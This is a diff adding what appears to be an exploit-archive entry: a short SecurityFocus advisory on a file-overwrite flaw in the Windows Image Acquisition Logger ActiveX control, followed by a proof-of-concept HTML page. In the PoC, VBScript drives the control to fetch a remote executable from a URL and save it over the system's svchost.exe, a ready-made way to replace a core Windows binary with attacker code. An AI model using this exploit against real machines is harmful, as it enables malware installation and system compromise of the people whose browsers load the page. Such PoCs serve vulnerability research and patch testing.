@@ -1,0 +1,18 @@
+source: http://www.securityfocus.com/bid/31069/info
+
+Microsoft Windows Image Acquisition Logger ActiveX control is prone to a vulnerability that lets attackers overwrite files with arbitrary, attacker-controlled content. The issue occurs because the control fails to sanitize user-supplied input.
+
+An attacker can exploit this issue to overwrite files with attacker-supplied data, which will aid in further attacks. 
+
+<object classid="clsid:A1E75357-881A-419E-83E2-BB16DB197C68" id='test'></object>
+
+<input language=VBScript onclick=tryMe() type=button value='Click here to start the test'>
+
+<script language='vbscript'>
+  Sub tryMe
+   dim remURL
+   remURL = "http://victim.com/svchost.exe"
+   test.Open remURL, True
+   test.Save "C:\WINDOWS\system32\svchost.exe", True
+ End Sub
+</script>
